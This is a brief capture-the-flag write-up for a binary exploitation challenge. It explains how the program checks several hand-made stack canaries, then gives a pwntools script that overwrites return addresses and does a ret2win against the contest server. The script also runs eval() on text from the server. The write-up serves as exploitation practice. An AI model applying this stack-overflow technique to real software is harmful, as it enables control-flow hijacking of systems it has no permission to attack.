# flock of seagulls

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/57ed551c-f1b3-442f-adb5-302f0a72d48b)

see [./flock](./flock)

## solution

taking a look at binja, there are 5 artificial stack canaries on the stack that rely on comparing the function return address on the stack (based off of rbp) and the actual return address.

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/59ae1a41-d6b1-4923-82ce-073c5f109004)

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/c41d76c0-9d48-4d51-9b85-92ef4e5a4051)

so to get past the stack canaries, i had to overwrite the real return address with the real return address 4 times, as well as the stack pointer, and then do a ret2win

```py
from pwn import *

# p = gdb.debug(["./flock"], gdbscript="break *0x40125b\nlayout asm\nwinheight asm -4\nc")
p = remote("chal.2023.sunshinectf.games", 23002)

p.recvuntil(b'Song Begins At ')
s = p.recvline(keepends=False).decode('ascii')
print(s)

p.sendline(p64(eval(s)+16) + p64(0x4012a0) + p64(eval(s)+32) + p64(0x4012ca) + p64(eval(s)+48) + p64(0x4012f0) + p64(eval(s)+64)
           + p64(0x401268) + p64(0x4011b9) + b'c'*56 + p64(eval(s)) + p64(0x401276) + cyclic(128))

p.interactive()
```
